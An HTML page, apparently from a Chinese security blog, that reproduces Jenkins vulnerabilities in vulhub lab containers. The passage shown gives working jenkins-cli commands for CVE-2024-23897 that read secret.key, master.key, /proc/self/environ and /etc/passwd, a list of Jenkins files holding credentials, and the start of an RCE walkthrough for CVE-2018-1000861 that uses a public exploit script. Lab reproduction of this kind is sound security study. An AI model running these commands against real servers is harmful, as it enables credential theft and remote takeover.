+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86-1">漏洞原理
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1">漏洞复现
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%96%b9%e6%b3%951">方法1
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%96%b9%e6%b3%952">方法2
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%8f%8d%e5%bc%b9shell">反弹shell
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e5%a4%8d-1">如何修复
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#jenkins-cli-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9ecve-2017-1000353">Jenkins-CLI 远程代码执行漏洞（CVE-2017-1000353）
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e9%9d%b6%e5%9c%ba%e6%90%ad%e5%bb%ba-2">靶场搭建
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86-2">漏洞原理
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-2">漏洞复现
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%8f%8d%e5%bc%b9shell-1">反弹shell
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e5%a4%8d-2">如何修复
+        </a>
+      </li></ul>
+      <div class="hx:mt-8 hx:border-t hx:bg-white hx:pt-8 hx:shadow-[0_-12px_16px_white] hx:dark:bg-dark hx:dark:shadow-[0_-12px_16px_#111] hx:sticky hx:bottom-0 hx:flex hx:flex-col hx:items-start hx:gap-2 hx:pb-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-t hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:border-neutral-400">
+        <button aria-hidden="true" id="backToTop" onClick="scrollUp();" class="hx:cursor-pointer hx:transition-all hx:duration-75 hx:opacity-0 hx:text-xs hx:font-medium hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-100 hx:contrast-more:text-gray-800 hx:contrast-more:dark:text-gray-50">
+          <span>返回顶部</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="hx:inline hx:ltr:ml-1 hx:rtl:mr-1 hx:h-3.5 hx:w-3.5 hx:rounded-full hx:border hx:border-gray-500 hx:hover:border-gray-900 hx:dark:border-gray-400 hx:dark:hover:border-gray-100 hx:contrast-more:border-gray-800 hx:contrast-more:dark:border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx:w-full hx:break-words hx:flex hx:min-h-[calc(100vh-var(--navbar-height))] hx:min-w-0 hx:justify-center hx:pb-8 hx:pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main class="hx:w-full hx:min-w-0 hx:max-w-6xl hx:px-6 hx:pt-4 hx:md:px-12">
+        <div class="hx:mt-1.5 hx:flex hx:items-center hx:gap-1 hx:overflow-hidden hx:text-sm hx:text-gray-500 hx:dark:text-gray-400 hx:contrast-more:text-current">
+        <div class="hx:whitespace-nowrap hx:transition-colors hx:min-w-[24px] hx:overflow-hidden hx:text-ellipsis hx:hover:text-gray-900 hx:dark:hover:text-gray-100">
+          <a href="/vul/">Vul</a>
+        </div><svg class="hx:w-3.5 hx:shrink-0 hx:rtl:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg><div class="hx:whitespace-nowrap hx:transition-colors hx:font-medium hx:text-gray-700 hx:contrast-more:font-bold hx:contrast-more:text-current hx:dark:text-gray-100 hx:contrast-more:dark:text-current">Jenkins历史漏洞复现</div>
+  </div>
+
+        <h1 class="hx:mt-2 hx:text-4xl hx:font-bold hx:tracking-tight hx:text-slate-900 hx:dark:text-slate-100">Jenkins历史漏洞复现</h1>
+        <div class="hx:mt-4 hx:mb-16 hx:text-gray-500 hx:dark:text-gray-400 hx:text-sm hx:flex hx:items-center hx:flex-wrap hx:gap-y-2"><span class="hx:mr-1">January 26, 2026</span></div>
+        <div class="content">
+          <h2>介绍<span class="hx:absolute hx:-mt-20" id="介绍"></span>
+    <a href="#%e4%bb%8b%e7%bb%8d" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Jenkins 是一个基于 Java 开发的开源自动化服务器。它是目前全球最流行的 CI/CD（持续集成 / 持续交付）工具。</p>
+<ul>
+<li>持续集成 (Continuous Integration, CI)： 每当开发者提交代码，Jenkins 就会自动抓取代码，运行构建脚本（如编译）并执行自动化测试。这能确保新代码不会破坏原有功能，尽早发现错误。</li>
+<li>持续交付/部署 (Continuous Delivery/Deployment, CD)： 在测试通过后，Jenkins 可以自动将代码打包并发布到测试环境或生产环境，实现软件的快速迭代。
+Jenkins 工作流程</li>
+</ul>
+<ol>
+<li>提交代码： 开发者将代码推送到 GitHub/GitLab。</li>
+<li>触发构建： Jenkins 检测到代码更新（通过 Webhook），触发预设的任务。</li>
+<li>自动构建： Jenkins 拉取代码，进行编译（例如 Java 的 Maven 编译）。</li>
+<li>自动测试： 运行单元测试、集成测试。</li>
+<li>反馈结果： 如果构建失败，通过邮件或 Slack 钉钉通知团队。</li>
+<li>自动部署： 如果测试通过，自动将程序包部署到服务器上。</li>
+</ol>
+<h2>Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）<span class="hx:absolute hx:-mt-20" id="jenkins-cli-接口任意文件读取漏洞cve-2024-23897"></span>
+    <a href="#jenkins-cli-%e6%8e%a5%e5%8f%a3%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96%e6%bc%8f%e6%b4%9ecve-2024-23897" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><blockquote>
+  <p>靶场环境：vulhub/jenkins/CVE-2024-23897</p>
+
+</blockquote>
+<h3>靶场搭建<span class="hx:absolute hx:-mt-20" id="靶场搭建"></span>
+    <a href="#%e9%9d%b6%e5%9c%ba%e6%90%ad%e5%bb%ba" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>git clone https://github.com/vulhub/vulhub.git
+</span></span><span style="display:flex;"><span>cd vulhub/jenkins/CVE-2024-23897
+</span></span><span style="display:flex;"><span>docker compose up -d</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>启动后，访问<code>http://your-ip:8080/</code>即可查看到Jenkins页面</p>
+<h3>漏洞原理<span class="hx:absolute hx:-mt-20" id="漏洞原理"></span>
+    <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Jenkins提供了一个命令行的接口，用户可以下载一个命令行客户端jenkins-cli.jar到本地，并调用该客户端来执行一些Jenkins的功能。但是用户使用jenkins-cli.jar时，命令行是传到服务端解析的，而不是在jenkins-cli.jar里解析。这就导致了一个问题，Jenkins服务端解析命令行时使用了一个第三方库<a href="https://github.com/kohsuke/args4j"target="_blank" rel="noopener">args4j</a>，这个库实现了Linux中一个常见的功能——如果一个参数是以<code>@</code>开头，则会被自动认为是一个文件名，文件内容会被读取作为参数。Jenkins是在服务端解析的命令行参数，又支持args4j的这个特性，就造成文件读取漏洞。
+参考链接：</p>
+<ul>
+<li><a href="https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897/README.zh-cn.md"target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897/README.zh-cn.md</a></li>
+<li><a href="https://www.cnblogs.com/BMCel/p/18027664"target="_blank" rel="noopener">https://www.cnblogs.com/BMCel/p/18027664</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/jenkins-cve-2024-23897.html"target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/jenkins-cve-2024-23897.html</a></li>
+</ul>
+<h3>漏洞复现<span class="hx:absolute hx:-mt-20" id="漏洞复现"></span>
+    <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>利用漏洞直接使用官方提供的命令行客户端，在<code>http://your-ip:8080/jnlpJars/jenkins-cli.jar</code>下载</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>wget http://your-ip:8080/jnlpJars/jenkins-cli.jar</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/13afaec77e9da07a6cb85adf029f3db2.png" alt=""  loading="lazy" />
+这里的jdk版本是jdk8u292
+使用该工具读取目标服务器的<code>/proc/self/environ</code>文件，可以找到Jenkins的基础目录</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://your-ip:8080/ -http help <span style="color:#ae81ff">1</span> <span style="color:#e6db74">&#34;@/proc/self/environ&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/e0791804cda37965b1ff09973efa1c10.png" alt=""  loading="lazy" />
+<code>JENKINS_HOME=/var/jenkins_home</code>
+然后，可在该目录下读取敏感文件，如<code>secrets.key</code> or <code>master.key</code>（匿名情况下，只能通过命令行的报错读取文件的第一行）：</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://your-ip:8080/ -http help <span style="color:#ae81ff">1</span> <span style="color:#e6db74">&#34;@/var/jenkins_home/secret.key&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/7a22053c6a0aeca42ad34a4954137593.png" alt=""  loading="lazy" /></p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://your-ip:8080/ -http help <span style="color:#ae81ff">1</span> <span style="color:#e6db74">&#34;@/var/jenkins_home/secrets/master.key&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/f02b833eab007ab13d5d64e817eaaea9.png" alt=""  loading="lazy" />
+vulhub的靶场默认开启了“匿名用户可读”选项，某些Jenkins版本默认安装时可能也是开启的，但通常管理员会关闭这个功能。另外，大部分企业的Jenkins会安装“Matrix-based security”这样的插件来管理权限，也会影响“匿名用户可读”选项的值。</p>
+<ul>
+<li>当Jenkins开启了“匿名用户可读”功能，大部分命令都可以被调用</li>
+<li>当Jenkins关闭了“匿名用户可读”功能，只有help和who-am-i命令可以被调用
+如果Jenkins开启了“匿名用户可读”选项，则大部分命令都可以被调用，其中包括connect-node命令和reload-job命令。这俩命令可以用来读取文件全部内容</li>
+<li>connect-node</li>
+</ul>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://your-ip:8080/ -http connect-node <span style="color:#e6db74">&#34;@/etc/passwd&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/85e73a52ffed7fa847ef8eecffd7ceb7.png" alt=""  loading="lazy" /></p>
+<ul>
+<li>reload-job</li>
+</ul>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://your-ip:8080/ -http reload-job <span style="color:#e6db74">&#34;@/etc/passwd&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/fb67e07ab912dfd41876721bc6bf81db.png" alt=""  loading="lazy" />
+Jenkins敏感文件
+通过读<code>/proc/self/environ</code>文件拿到Jenkins的根目录，我们就可以来尝试读取下面这些敏感文件。</p>
+<ul>
+<li>/var/jenkins_home/users/users.xml 用户列表和每个用户信息所在的文件目录</li>
+<li>/var/jenkins_home/users/读users.xml得到用户名/config.xml 保存所有用户的信息，包括密码、种子、Token等</li>
+<li>/var/jenkins_home/secret.key 保存Remember-Me Cookie中的一部分</li>
+<li>/var/jenkins_home/secrets/master.key 作为AES解密密钥</li>
+<li>/var/jenkins_home/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac 作为计算hmac签名时的Key
+前面文件都可以直接读取，最后一个文件是一个二进制文件
+CVE-2024-23897漏洞的利用有下面两个比较核心的限制：</li>
+<li>是否开启“匿名用户可读”选项</li>
+<li>服务端字符集是否兼容读取二进制文件
+第一个问题的结果会影响攻击者是否能够读取文件的全文，包括用户的密码等信息；第二个问题的结果影响攻击者是否能够伪造任意用户的remember-me Cookie。</li>
+</ul>
+<h3>如何修复<span class="hx:absolute hx:-mt-20" id="如何修复"></span>
+    <a href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e5%a4%8d" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>更新版本，升级到安全的版本</p>
+<h2>Jenkins 远程代码执行漏洞（CVE-2018-1000861）<span class="hx:absolute hx:-mt-20" id="jenkins-远程代码执行漏洞cve-2018-1000861"></span>
+    <a href="#jenkins-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9ecve-2018-1000861" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><blockquote>
+  <p>靶场环境：vulhub/jenkins/CVE-2018-1000861</p>
+
+</blockquote>
+<h3>靶场搭建<span class="hx:absolute hx:-mt-20" id="靶场搭建-1"></span>
+    <a href="#%e9%9d%b6%e5%9c%ba%e6%90%ad%e5%bb%ba-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>git clone https://github.com/vulhub/vulhub.git
+</span></span><span style="display:flex;"><span>cd vulhub/jenkins/CVE-2018-1000861
+</span></span><span style="display:flex;"><span>docker compose up -d</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>启动后，访问<code>http://your-ip:8080/</code>即可查看到Jenkins页面</p>
+<h3>漏洞原理<span class="hx:absolute hx:-mt-20" id="漏洞原理-1"></span>
+    <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Jenkins 核心和插件中存在的一个高危的远程代码执行（RCE）漏洞。该漏洞源于 Jenkins 的 “安全审计”（Security Realm） 和 “用户管理” 功能中的一个缺陷。</p>
+<p>在 <code>stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java</code> 中，攻击者可以通过访问构造的 URL 路径来调用 Java 对象上的某些方法。
+构造特殊 HTTP POST 请求执行 Groovy 代码，以<code>jenkins</code>用户身份执行系统命令</p>
+<p>Jenkins提供<code>/securityRealm/user/[username]/descriptorByName/[descriptor]/checkField</code>的HTTP API端点。这个端点原本的设计目的是让系统在用户注册或修改资料时，异步验证用户输入的用户名、邮箱等字段是否合法（例如，邮箱格式是否正确）。但该端点的权限检查机制存在缺陷。攻击者可以通过在<code>[descriptor]</code>部分插入特定的路径（如 <code>org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript</code>），从而将请求重定向到处理Groovy脚本的解析器。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2018-1000861/README.zh-cn.md"target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2018-1000861/README.zh-cn.md</a></li>
+<li><a href="https://www.cnblogs.com/jzssuanfa/p/19255187"target="_blank" rel="noopener">https://www.cnblogs.com/jzssuanfa/p/19255187</a></li>
+</ul>
+<h3>漏洞复现<span class="hx:absolute hx:-mt-20" id="漏洞复现-1"></span>
+    <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><h4>方法1<span class="hx:absolute hx:-mt-20" id="方法1"></span>
+    <a href="#%e6%96%b9%e6%b3%951" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>使用 @orangetw 提供的<a href="https://github.com/orangetw/awesome-jenkins-rce-2019"target="_blank" rel="noopener">一键化 POC 脚本</a>
+直接复制exp.py文件内容，保存为exp.py
+
+    <img src="../imgs/8c4d32b6a5a775c0ecb164924569655f.png" alt=""  loading="lazy" />
+这个脚本需要使用python2去运行，需要使用pip安装<code>requests</code>,<code>enum</code>模块</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>pip install requests enum
+</span></span><span style="display:flex;"><span>python exp.py http://your-ip:port <span style="color:#e6db74">&#39;要执行的命令&#39;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
